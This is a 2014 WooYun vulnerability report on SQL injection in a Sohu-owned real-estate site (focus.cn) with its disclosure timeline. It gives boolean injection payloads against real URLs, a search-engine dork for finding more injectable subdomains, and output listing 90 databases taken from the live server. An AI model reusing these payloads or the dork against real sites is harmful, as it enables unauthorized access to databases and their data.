wybug_title: 搜狐旗下某站二级域名下存在通用sql注入（涉及90个库）
wybug_detail:
漏洞详情 披露状态：   									2014-04-16：	细节已通知厂商并且等待厂商处理中									2014-04-16：	厂商已经确认，细节仅向厂商公开									2014-04-26：	细节向核心白帽子及相关领域专家公开									2014-05-06：	细节向普通白帽子公开									2014-05-16：	细节向实习白帽子公开									2014-05-31：	细节向公众公开  简要描述： 一哥们组团练级，当小弟的凑个热闹 详细说明：  http://cc.focus.cn/common/modules/dmc/loupandyview.php?id=696' and 1=1 and '%'='%正常回显http://cc.focus.cn/common/modules/dmc/loupandyview.php?id=696' and 1=2 and '%'='%跳白页http://nj.focus.cn/common/modules/dmc/loupandyview.php?id=101081....很多很多   漏洞证明：  baidu & google 搜如下内容，二级域名下几乎都是sql注入点site:focus.cn inurl:loupandyview.php?id

90个库，发了available databases [90]:[*] anyanghouse[*] anyanghouse_forum[*] anyanghouse_sort[*] binzhouhouse[*] binzhouhouse_forum[*] binzhouhouse_sort[*] cchouse[*] cchouse_forum[*] cchouse_sort[*] dandonghouse[*] dandonghouse_forum[*] dandonghouse_sort[*] datonghouse[*] datonghouse_forum[*] datonghouse_sort[*] dlhouse[*] dlhouse_forum[*] dlhouse_sort[*] dongyinghouse[*] dongyinghouse_forum[*] dongyinghouse_sort[*] dqhouse[*] dqhouse_forum[*] dqhouse_sort[*] dzhouse[*] dzhouse_forum[*] dzhouse_sort[*] homepages[*] house[*] hrbhouse[*] hrbhouse_forum[*] hrbhouse_sort[*] information_schema[*] jininghouse[*] jininghouse_forum[*] jininghouse_sort[*] kfhouse[*] kfhouse_forum[*] kfhouse_sort[*] linfenhouse[*] linfenhouse_forum[*] linfenhouse_sort[*] mysql[*] mysql_identity[*] nanyanghouse[*] nanyanghouse_forum[*] nanyanghouse_sort[*] puyanghouse[*] puyanghouse_forum[*] puyanghouse_sort[*] qdhouse[*] qdhouse_forum[*] qdhouse_sort[*] qqhehouse[*] qqhehouse_forum[*] qqhehouse_sort[*] sjzhouse[*] sjzhouse_forum[*] sjzhouse_sort[*] songyuanhouse[*] songyuanhouse_forum[*] songyuanhouse_sort[*] taianhouse[*] taianhouse_forum[*] taianhouse_sort[*] test[*] testhouse[*] testhouse_forum[*] testhouse_sort[*] tyhouse[*] tyhouse_forum[*] tyhouse_sort[*] weihaihouse[*] weihaihouse_forum[*] weihaihouse_sort[*] xinxianghouse[*] xinxianghouse_forum[*] xinxianghouse_sort[*] xuchanghouse[*] xuchanghouse_forum[*] xuchanghouse_sort[*] xyhouse[*] xyhouse_forum[*] xyhouse_sort[*] yqhouse[*] yqhouse_forum[*] yqhouse_sort[*] zibohouse[*] zibohouse_forum[*] zibohouse_sort   修复方案：  就不继续渗透了   版权声明：转载请注明来源 浩天@乌云
